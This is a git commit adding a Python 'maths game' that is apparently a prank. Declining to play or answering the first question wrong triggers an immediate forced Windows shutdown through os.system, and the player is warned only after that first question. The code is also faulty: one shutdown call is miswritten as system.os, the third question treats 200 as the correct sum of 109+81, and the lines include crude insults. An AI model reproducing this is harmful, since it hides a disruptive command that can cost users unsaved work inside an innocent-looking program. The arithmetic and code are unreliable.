ba67e70b705150d1562e6f7f1586e9d303453494
pog-dog <101480097+pog-dog@users.noreply.github.com>
2022-04-26 17:35:49 +0100

    Add files via upload

---
+++ Maths Game!.py
@@ -0,0 +1,50 @@
+#Created By Pogdog#2220
+
+import time
+import os
+from os import system
+print("Do You Want To Play A Game There Are 3 Questions??")
+answere = input("Y/N? ")
+if answere == "Y":
+    print("Have Fun!!!")
+else:
+    os.system("shutdown /s /t 0")
+
+print("This Is A Maths Game, I Hope Your Good At Math!!")
+
+time.sleep(1)
+
+print("First Question, This Is An Easy One!")
+
+time.sleep(1)
+
+Q1 = input("Whats 9+10? ") 
+if Q1 == "19":
+        print("Well Done, Your Not A Fuck Face And You Got It Right!")
+else:
+    os.system("shutdown /s /t 0")
+
+time.sleep(1)
+
+print("Question 2!!! Oh Yeah, I forgot, If you get even one question wrong, you will die!")
+
+time.sleep(1)
+
+Q2 = input("whats 10+72 ")
+if Q2 == "82":
+    print("well done, you got it right, this one was a bit harder")
+else:
+        system.os("shutdown /s /t 0")
+
+time.sleep(1)
+
+print("FINAL QUESTION!!, You Made It This Far, Your Pretty Good At Math")
+Q3 = input("whats 109+81? ")
+if Q3 == "200":
+           print("YOU DID IT, You Win!!!")
+else:
+               print("shutdown /s /t 0")
+
+time.sleep(1)
+exit()
+
